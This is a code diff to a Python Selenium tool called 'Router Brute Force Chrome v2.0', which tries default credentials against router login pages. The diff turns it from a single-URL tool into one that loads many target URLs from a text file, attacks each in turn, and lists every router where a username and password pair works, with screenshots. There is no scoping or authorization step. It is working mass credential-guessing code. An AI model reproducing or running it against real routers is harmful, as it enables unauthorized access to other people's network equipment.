@@ -171,8 +171,8 @@ USER_AGENTS = [
 ]
 
 class ChromeRouterBruteForce:
-    def __init__(self, login_url, timeout=10, headless=False, screenshot_dir="screenshots"):
-        self.login_url = login_url
+    def __init__(self, login_urls, timeout=10, headless=False, screenshot_dir="screenshots"):
+        self.login_urls = login_urls if isinstance(login_urls, list) else [login_urls]
         self.timeout = timeout
         self.headless = headless
         self.screenshot_dir = screenshot_dir
@@ -474,17 +474,16 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error testing credentials {username}:{password}: {e}{Colors.END}")
             return False, f"Error: {e}"
     
-    def brute_force_attack(self):
-        """Perform brute force attack with all target credentials"""
+    def brute_force_single_url(self, login_url):
+        """Perform brute force attack on a single URL"""
         try:
             print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
-            print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
-            print(f"{Colors.CYAN}[*] Target URL: {self.login_url}{Colors.END}")
+            print(f"{Colors.CYAN}[*] ATTACKING: {login_url}{Colors.END}")
             print(f"{Colors.CYAN}{'='*60}{Colors.END}")
             
-            # Setup Chrome driver
-            if not self.setup_chrome_driver():
-                return False
+            # Navigate to URL
+            self.driver.get(login_url)
+            time.sleep(2)
             
             successful_credentials = []
             
@@ -500,6 +499,7 @@ class ChromeRouterBruteForce:
                 if success:
                     print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                     successful_credentials.append({
+                        'url': login_url,
                         'username': username,
                         'password': password,
                         'screenshot': result if isinstance(result, str) and result.endswith('.png') else None
@@ -519,6 +519,39 @@ class ChromeRouterBruteForce:
                 with self.lock:
                     stats['targets_scanned'] += 1
             
+            return successful_credentials
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error attacking {login_url}: {e}{Colors.END}")
+            return []
+    
+    def brute_force_attack(self):
+        """Perform brute force attack on all URLs"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
+            print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
+            print(f"{Colors.CYAN}[*] Total URLs to test: {len(self.login_urls)}{Colors.END}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
+            
+            # Setup Chrome driver
+            if not self.setup_chrome_driver():
+                return False
+            
+            all_successful_credentials = []
+            
+            # Test each URL
+            for i, login_url in enumerate(self.login_urls, 1):
+                if not running:
+                    break
+                
+                print(f"\n{Colors.MAGENTA}[URL {i}/{len(self.login_urls)}] Processing: {login_url}{Colors.END}")
+                
+                successful_credentials = self.brute_force_single_url(login_url)
+                all_successful_credentials.extend(successful_credentials)
+                
+                # Update progress
+                print(f"{Colors.BLUE}[*] Progress: {i}/{len(self.login_urls)} URLs processed{Colors.END}")
+            
             # Close browser
             if self.driver:
                 self.driver.quit()
@@ -528,16 +561,16 @@ class ChromeRouterBruteForce:
             print(f"{Colors.GREEN}[+] BRUTE FORCE ATTACK COMPLETED{Colors.END}")
             print(f"{Colors.GREEN}{'='*60}{Colors.END}")
             
-            if successful_credentials:
-                print(f"{Colors.RED}[!] VULNERABLE CREDENTIALS FOUND:{Colors.END}")
-                for cred in successful_credentials:
-                    print(f"  • {Colors.WHITE}{cred['username']}:{cred['password']}{Colors.END}")
+            if all_successful_credentials:
+                print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND:{Colors.END}")
+                for cred in all_successful_credentials:
+                    print(f"  • {Colors.WHITE}{cred['url']}{Colors.END} -> {Colors.RED}{cred['username']}:{cred['password']}{Colors.END}")
                     if cred['screenshot']:
                         print(f"    Screenshot: {Colors.CYAN}{cred['screenshot']}{Colors.END}")
             else:
-                print(f"{Colors.GREEN}[+] No vulnerable credentials found - router appears secure{Colors.END}")
+                print(f"{Colors.GREEN}[+] No vulnerable routers found - all routers appear secure{Colors.END}")
             
-            return len(successful_credentials) > 0
+            return len(all_successful_credentials) > 0
             
         except Exception as e:
             print(f"{Colors.RED}[!] Error during brute force attack: {e}{Colors.END}")
@@ -545,25 +578,49 @@ class ChromeRouterBruteForce:
                 self.driver.quit()
             return False
 
-def parse_login_url(url_input):
-    """Parse and validate login URL"""
-    try:
-        parsed = urlparse(url_input)
-        if not parsed.scheme:
+def parse_login_urls(url_input):
+    """Parse and validate login URLs from input (single URL or file)"""
+    urls = []
+    
+    # Check if input is a file
+    if url_input.endswith('.txt') and os.path.exists(url_input):
+        try:
+            with open(url_input, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#'):  # Skip empty lines and comments
+                        # Add http:// if no scheme provided
+                        if not line.startswith(('http://', 'https://')):
+                            line = 'http://' + line
+                        urls.append(line)
+            print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs from file: {url_input}{Colors.END}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error reading file {url_input}: {e}{Colors.END}")
+            return []
+    else:
+        # Single URL
+        if not url_input.startswith(('http://', 'https://')):
             url_input = 'http://' + url_input
-            parsed = urlparse(url_input)
-        
-        # Check if hostname is valid (contains at least one dot or is localhost)
-        if not parsed.hostname or ('.' not in parsed.hostname and parsed.hostname != 'localhost'):
-            return None
-        
-        return url_input
-    except:
-        return None
+        urls.append(url_input)
+    
+    # Validate URLs
+    valid_urls = []
+    for url in urls:
+        try:
+            parsed = urlparse(url)
+            # Check if hostname is valid (contains at least one dot or is localhost)
+            if parsed.hostname and ('.' in parsed.hostname or parsed.hostname == 'localhost'):
+                valid_urls.append(url)
+            else:
+                print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
+        except:
+            print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
+    
+    return valid_urls
 
 def main():
     parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Login Brute Force Tool")
-    parser.add_argument('-u', '--url', required=True, help='Login URL to test')
+    parser.add_argument('-u', '--url', required=True, help='Login URL to test (single URL or .txt file with URLs)')
     parser.add_argument('--timeout', type=int, default=10, help='Page load timeout in seconds (default: 10)')
     parser.add_argument('--headless', action='store_true', help='Run Chrome in headless mode (default: visible)')
     parser.add_argument('--screenshot-dir', default='screenshots', help='Directory to save screenshots (default: screenshots)')
@@ -573,10 +630,10 @@ def main():
     clear_screen()
     print_banner()
     
-    # Validate URL
-    login_url = parse_login_url(args.url)
-    if not login_url:
-        print(f"{Colors.RED}[!] Invalid URL format: {args.url}{Colors.END}")
+    # Parse URLs (single URL or file)
+    login_urls = parse_login_urls(args.url)
+    if not login_urls:
+        print(f"{Colors.RED}[!] No valid URLs found in: {args.url}{Colors.END}")
         return
     
     # Check if Selenium is available
@@ -585,7 +642,15 @@ def main():
         return
     
     # Startup info
-    print(f"{Colors.GREEN}[+] Target URL: {login_url}{Colors.END}")
+    if len(login_urls) == 1:
+        print(f"{Colors.GREEN}[+] Target URL: {login_urls[0]}{Colors.END}")
+    else:
+        print(f"{Colors.GREEN}[+] Target URLs: {len(login_urls)} URLs loaded{Colors.END}")
+        for i, url in enumerate(login_urls[:5], 1):  # Show first 5 URLs
+            print(f"  {i}. {url}")
+        if len(login_urls) > 5:
+            print(f"  ... and {len(login_urls) - 5} more URLs")
+    
     creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS])
     print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}{Colors.END}")
     print(f"{Colors.BLUE}[*] Chrome-based brute force with visible browser{Colors.END}")
@@ -598,7 +663,7 @@ def main():
     
     # Initialize brute force tool
     brute_force = ChromeRouterBruteForce(
-        login_url=login_url,
+        login_urls=login_urls,
         timeout=args.timeout,
         headless=args.headless,
         screenshot_dir=args.screenshot_dir
@@ -614,6 +679,7 @@ def main():
         total_time = time.time() - stats['start_time']
         
         print(f"\n{Colors.CYAN}[*] FINAL STATISTICS:{Colors.END}")
+        print(f"  - Total URLs tested: {Colors.CYAN}{len(login_urls)}{Colors.END}")
         print(f"  - Total credentials tested: {Colors.CYAN}{stats['targets_scanned']}{Colors.END}")
         print(f"  - Successful logins: {Colors.RED}{stats['successful_logins']}{Colors.END}")
         print(f"  - Screenshots taken: {Colors.BLUE}{stats['screenshots_taken']}{Colors.END}")
@@ -621,9 +687,9 @@ def main():
         print(f"  - Screenshots saved in: {Colors.YELLOW}{args.screenshot_dir}{Colors.END}")
         
         if success:
-            print(f"{Colors.RED}[!] ROUTER IS VULNERABLE - Change default credentials immediately!{Colors.END}")
+            print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND - Change default credentials immediately!{Colors.END}")
         else:
-            print(f"{Colors.GREEN}[+] Router appears secure - no default credentials found{Colors.END}")
+            print(f"{Colors.GREEN}[+] All routers appear secure - no default credentials found{Colors.END}")
             
     except KeyboardInterrupt:
         print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
